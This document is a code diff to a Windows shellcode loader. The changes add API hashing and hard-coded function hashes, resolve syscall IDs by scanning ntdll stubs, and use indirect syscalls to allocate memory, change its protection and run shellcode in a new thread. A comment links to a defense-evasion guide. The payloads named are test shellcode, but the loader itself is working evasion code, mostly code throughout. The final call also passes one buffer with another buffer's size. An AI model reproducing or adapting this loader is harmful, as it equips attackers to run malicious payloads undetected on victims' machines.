@@ -1,8 +1,9 @@
 #include <Windows.h>
-#include <stdio.h>
+
 
 #include "ShellCodeLoader.h"
 #include "WinApiReImplementations.h"
+#include "shellcode.h"
 
 #pragma comment(linker, "/section:.data,RW")//.data section writable
 //#pragma comment(linker, "/section:.data,RWE")//.data section executable
@@ -28,17 +29,19 @@ extern DoIndirectSyscall();
 * arg3: pointer to DWORD. This will be populated with the Syscall ID
 * return: -1 / ERROR_SUCCESS.
 */
-NTSTATUS resolve_syscall(HMODULE hNtDll, LPCSTR funcName, _Out_ LPVOID *outpSyscall, _Out_ LPDWORD outSyscallId) {
+//NTSTATUS resolve_syscall(HMODULE hNtDll, LPCSTR funcName, _Out_ LPVOID *outpSyscall, _Out_ LPDWORD outSyscallId) {
+NTSTATUS resolve_syscall(HMODULE hNtDll, DWORD function_hash, _Out_ LPVOID *outpSyscall, _Out_ LPDWORD outSyscallId) {
     // tbd: Avoid GPA and use API hashes. 
     // See https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware for a copy-paste ready implementation of GPA
-    LPVOID pProc = (LPVOID)GetProcAddress(hNtDll, funcName);
-
+    //LPVOID pProc = (LPVOID)GetProcAddress(hNtDll, funcName);
+    LPVOID pProc = GetProcAddressByHash(hNtDll, function_hash);
     if (pProc == NULL) {
-        DEBUG_PRINT("GetProcAddress failed for %s\n", funcName);
+        DEBUG_PRINT("GetProcAddressByHash failed for %p\n", function_hash);
         return (NTSTATUS) -1;
     }
+    
 
-    DEBUG_PRINT("Function %s at %p\n", funcName, pProc);
+    DEBUG_PRINT("Function for hash %p at %p\n", function_hash, pProc);
     /*
     0:000> uf ntdll!NtCreateProcess
     ntdll!NtCreateProcess:
@@ -54,30 +57,30 @@ NTSTATUS resolve_syscall(HMODULE hNtDll, LPCSTR funcName, _Out_ LPVOID *outpSysc
 
     DWORD syscallId = 0;
     PBYTE ptr = (PBYTE)pProc;
-    // 0x0f05 => syscall
     while (TRUE) {
         // 0xb8 => mov eax, ...
         if (*ptr == 0xb8) {
             syscallId = *(DWORD*)(ptr + 1);
         }
+        // 0x0f05 => syscall
         else if (*ptr == 0x0f) {
             if (*(ptr + 1) == 0x05) {
                 // 0xc3 => ret
                 if (*(ptr + 2) == 0xc3) {
-                    DEBUG_PRINT("Syscall for %s at %p. ID: %02x\n", funcName, ptr, syscallId);
-                    //return syscallId;
+                    DEBUG_PRINT("Syscall for %p at %p. ID: %02x\n", function_hash, ptr, syscallId);
                     *outSyscallId = syscallId;
                     *outpSyscall = ptr;
                     return ERROR_SUCCESS;
                 }
             }
         }
-        ptr++;
+
+        // prevent an endless loop
         if ((ptr - (PBYTE)pProc) == 50) {
-            DEBUG_PRINT("Could not identify Syscall for %s\n", funcName);
-            //break;
+            DEBUG_PRINT("Could not identify Syscall for %p\n", function_hash);
             return (NTSTATUS)-1;
         }
+        ptr++;
     }
 }
 
@@ -92,28 +95,32 @@ NTSTATUS resolve_syscall(HMODULE hNtDll, LPCSTR funcName, _Out_ LPVOID *outpSysc
 NTSTATUS populate_syscall_table(HMODULE hNtDll, _Out_ PSYSCALL_INFO_TABLE pSyscallTable) {
     LPCSTR funcName = "NtAllocateVirtualMemory";
     NTSTATUS status = (NTSTATUS)-1; 
-    status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtAllocateVirtualMemory.pSyscall, &pSyscallTable->NtAllocateVirtualMemory.syscallId);
+    //status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtAllocateVirtualMemory.pSyscall, &pSyscallTable->NtAllocateVirtualMemory.syscallId);
+    status = resolve_syscall(hNtDll, pSyscallTable->NtAllocateVirtualMemory.functionHash, &pSyscallTable->NtAllocateVirtualMemory.pSyscall, &pSyscallTable->NtAllocateVirtualMemory.syscallId);
     if (status != ERROR_SUCCESS) {
         DEBUG_PRINT("Failed to resolve Syscall for %s!", funcName);
       return (NTSTATUS)-1;
     }
 
     funcName = "NtProtectVirtualMemory";
-    status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtProtectVirtualMemory.pSyscall, &pSyscallTable->NtProtectVirtualMemory.syscallId);
+    //status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtProtectVirtualMemory.pSyscall, &pSyscallTable->NtProtectVirtualMemory.syscallId);
+    status = resolve_syscall(hNtDll, pSyscallTable->NtProtectVirtualMemory.functionHash, &pSyscallTable->NtProtectVirtualMemory.pSyscall, &pSyscallTable->NtProtectVirtualMemory.syscallId);
     if (status != ERROR_SUCCESS) {
         DEBUG_PRINT("Failed to resolve Syscall for %s!", funcName);
         return (NTSTATUS)-1;
     }
 
     funcName = "NtCreateThreadEx";
-    status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtCreateThreadEx.pSyscall, &pSyscallTable->NtCreateThreadEx.syscallId);
+    //status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtCreateThreadEx.pSyscall, &pSyscallTable->NtCreateThreadEx.syscallId);
+    status = resolve_syscall(hNtDll, pSyscallTable->NtCreateThreadEx.functionHash, &pSyscallTable->NtCreateThreadEx.pSyscall, &pSyscallTable->NtCreateThreadEx.syscallId);
     if (status != ERROR_SUCCESS) {
         DEBUG_PRINT("Failed to resolve Syscall for %s!", funcName);
         return (NTSTATUS)-1;
     }
 
     funcName = "NtWaitForSingleObject";
-    status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtWaitForSingleObject.pSyscall, &pSyscallTable->NtWaitForSingleObject.syscallId);
+    //status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtWaitForSingleObject.pSyscall, &pSyscallTable->NtWaitForSingleObject.syscallId);
+    status = resolve_syscall(hNtDll, pSyscallTable->NtWaitForSingleObject.functionHash, &pSyscallTable->NtWaitForSingleObject.pSyscall, &pSyscallTable->NtWaitForSingleObject.syscallId);
     if (status != ERROR_SUCCESS) {
         DEBUG_PRINT("Failed to resolve Syscall for %s!", funcName);
         return (NTSTATUS)-1;
@@ -172,7 +179,7 @@ NTSTATUS execute_shellcode_create_thread(PSYSCALL_INFO_TABLE pSyscallTable, cons
     PrepareSyscall(pSyscallTable->NtCreateThreadEx.syscallId, pSyscallTable->NtCreateThreadEx.pSyscall);
     status = DoIndirectSyscall(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
 
-    if (status != ERROR_SUCCESS) {
+    if ( (status != ERROR_SUCCESS) || (hHostThread == INVALID_HANDLE_VALUE) ) {
         DEBUG_PRINT("NtCreateThreadEx failed!");
         return (NTSTATUS)-1;
     }
@@ -206,34 +213,22 @@ int main()
     }
 
     DEBUG_PRINT("NtDll mapped to %p\n", hNtDll);
-    // https://devblogs.microsoft.com/oldnewthing/20110921-00/?p=9583
-    // introduced MOV EDI, EDI just to make the shellcode more distinguashalble from NOP only
-    // \w this shellcode, VisualStudio should throw an error as "A breakpoint instruction (__debugbreak() statement or a similar call) was executed in ShellcodeLoader.exe." when debugging
-    // In the Disassembly window, click "View" to check that the shellcode has been copied correctly. It should look similar to the following:
-    // 000001C029970000  int         3
-    // 000001C029970001  nop
-    // 000001C029970002  mov         edi, edi
-    // 000001C029970004  nop
-    // 000001C029970005  mov         edi, edi
-    // 000001C029970007  int         3
-    // 000001C029970008  int         3
-    // 000001C029970009  int         3
-    // 000001C02997000A  int         3
-    const CHAR shellcode[] = {
-        0xcc,       // INT3
-        0x90,       // NOP
-        0x8b, 0xff, // MOV EDI, EDI
-        0x90,       // NOP
-        0x8b, 0xff, // MOV EDI, EDI
-        0xcc,       // INT3
-        0xcc,       // INT3
-        0xcc,       // INT3
-        0xcc        // INT3
-    };
-
-    DEBUG_PRINT("sizeof shellcode: %d\n", (int)sizeof(shellcode));
     
+    DEBUG_PRINT("sizeof shellcode: %d\n", (int)sizeof(shellcode_calc));
+    
+    /*
+    * C:\Users\joshua\Desktop\ShellCodeLoader_Indirect_Syscalls>"C:\Program Files\Python311\python.exe" create_api_hashes.py
+    * string: ntdll, hash: 0x1006db43
+    * string: NtAllocateVirtualMemory, hash: 0x6793c34c
+    * string: NtProtectVirtualMemory, hash: 0x82962c8
+    * string: NtCreateThreadEx, hash: 0xcb0c2130
+    * string: NtWaitForSingleObject, hash: 0x4c6dc63c
+    */
     SYSCALL_INFO_TABLE syscalls = { 0 };
+    syscalls.NtAllocateVirtualMemory.functionHash = 0x6793c34c;
+    syscalls.NtProtectVirtualMemory.functionHash = 0x82962c8; 
+    syscalls.NtCreateThreadEx.functionHash = 0xcb0c2130;
+    syscalls.NtWaitForSingleObject.functionHash = 0x4c6dc63c; 
 
     NTSTATUS status = populate_syscall_table(hNtDll, &syscalls); 
 
@@ -241,8 +236,8 @@ int main()
         DEBUG_PRINT("Error populating Syscall table!\n");
         return -1;
     }
-
-    status = execute_shellcode_create_thread(&syscalls, shellcode, sizeof(shellcode)); 
+    
+    status = execute_shellcode_create_thread(&syscalls, shellcode_int3, sizeof(shellcode_calc));
 
     if (status != ERROR_SUCCESS) {
         DEBUG_PRINT("Error executing shellcode!\n");
